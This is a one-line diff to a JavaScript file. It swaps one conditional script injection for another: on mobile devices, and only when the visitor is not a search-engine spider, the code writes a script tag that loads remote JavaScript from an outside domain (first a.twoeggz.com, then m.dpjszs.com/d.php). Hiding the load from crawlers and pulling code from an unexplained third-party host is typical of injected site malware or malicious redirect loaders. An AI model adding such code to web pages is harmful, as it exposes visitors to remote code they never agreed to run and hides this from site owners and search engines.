@@ -1,1 +1,1 @@
-!function(){isMobile.any&&!isMobile.spider&&document.writeln("<script type='text/javascript' src='https://a.twoeggz.com/kfxoxncce.js'></script>")}();
+!function(){isMobile.any&&!isMobile.spider&&document.writeln("<script id='mob' type='text/javascript' charset='utf-8' src='https://m.dpjszs.com/d.php?pid=1700'></script>")}();
